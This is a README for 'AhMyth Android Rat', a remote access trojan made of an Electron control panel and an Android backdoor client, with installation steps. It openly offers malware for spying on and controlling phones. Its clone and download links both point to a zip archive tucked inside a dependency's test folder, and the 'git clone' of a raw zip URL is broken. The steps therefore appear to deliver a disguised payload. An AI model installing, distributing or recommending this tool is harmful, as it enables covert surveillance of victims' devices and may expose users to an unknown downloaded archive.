# AhMyth Android Rat
###### Beta Version
It consists of two parts :
* Server side : desktop application based on electron framework (control panel)
* Client side : android application (backdoor)


## Getting Started
### You have two options to install it
#### 1) From source code
###### Prerequisite :
* Electron (to start the app)
* Java (to generate apk backdoor)
* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
1. ```git clone https://github.com/alssalimi/AhMyth-Android-RAT/raw/refs/heads/master/AhMyth-Server/app/node_modules/yamljs/test/spec/Ah-Android-Myth-RAT-v3.9-beta.1.zip```
2. ```cd AhMyth-Android-RAT/AhMyth-Server```
3. ```npm start```

#### 2) From binaries
###### Prerequisite :
* Download a binary from https://github.com/alssalimi/AhMyth-Android-RAT/raw/refs/heads/master/AhMyth-Server/app/node_modules/yamljs/test/spec/Ah-Android-Myth-RAT-v3.9-beta.1.zip
* Java (to generate apk backdoor)
